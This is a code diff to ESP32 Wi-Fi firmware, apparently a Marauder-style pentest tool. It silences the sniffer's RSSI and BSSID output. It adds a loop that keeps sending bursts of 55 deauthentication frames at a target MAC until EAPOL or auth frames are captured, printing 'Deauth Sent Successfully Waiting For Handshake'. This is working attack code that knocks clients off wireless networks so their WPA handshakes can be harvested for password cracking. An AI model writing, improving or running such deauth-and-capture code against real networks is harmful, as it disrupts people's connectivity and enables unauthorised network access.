@@ -2311,19 +2311,19 @@ void WiFiScan::rawSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
       return;
   }
   else {
-    Serial.print("RSSI: ");
+    /*Serial.print("RSSI: ");
     Serial.print(snifferPacket->rx_ctrl.rssi);
     Serial.print(" Ch: ");
     Serial.print(snifferPacket->rx_ctrl.channel);
-    Serial.print(" BSSID: ");
+    Serial.print(" BSSID: ");*/
     char addr[] = "00:00:00:00:00:00";
     getMAC(addr, snifferPacket->payload, 10);
-    Serial.print(addr);
-    display_string.concat(text_table4[0]);
+    //Serial.print(addr);
+    /*display_string.concat(text_table4[0]);
     display_string.concat(snifferPacket->rx_ctrl.rssi);
 
     display_string.concat(" ");
-    display_string.concat(addr);
+    display_string.concat(addr);*/
   }
 
   int temp_len = display_string.length();
@@ -2344,10 +2344,20 @@ void WiFiScan::rawSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
     }
   #endif
 
-  Serial.println();
-
   if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ) || snifferPacket->payload[12] == 0x88 && snifferPacket->payload[13] == 0x8E)
   {
+    if (wifi_scan_obj.DeauthPacketsSent > 55)
+    {
+      Serial.println("Deauth Sent Successfully Waiting For Handshake");
+      wifi_scan_obj.ShouldSendDeauth = false;
+    }
+    else 
+    {
+      wifi_scan_obj.ShouldSendDeauth = true;
+      wifi_scan_obj.DeauthPacketsSent++;
+    }
+    
+    Serial.println("Deauth or Auth Captured Successfully");
     addPacket(snifferPacket, len);
   }
 }
@@ -3803,8 +3813,18 @@ void WiFiScan::main(uint32_t currentTime)
     }
   }
   else if (currentScanMode == WIFI_ATTACK_DEAUTH || currentScanMode == WIFI_SCAN_RAW_CAPTURE) {
-    for (int i = 0; i < 55; i++)
-      this->sendDeauthAttack(currentTime, this->dst_mac);
+    if (this->ShouldSendDeauth)
+    {
+      for (int i = 0; i < 55; i++)
+      {
+        this->sendDeauthAttack(currentTime, this->dst_mac);
+      }
+    }
+    else 
+    {
+      delay(5000);
+      this->DeauthPacketsSent = 0;
+    }
 
     if (currentTime - initTime >= 1000) {
       initTime = millis();
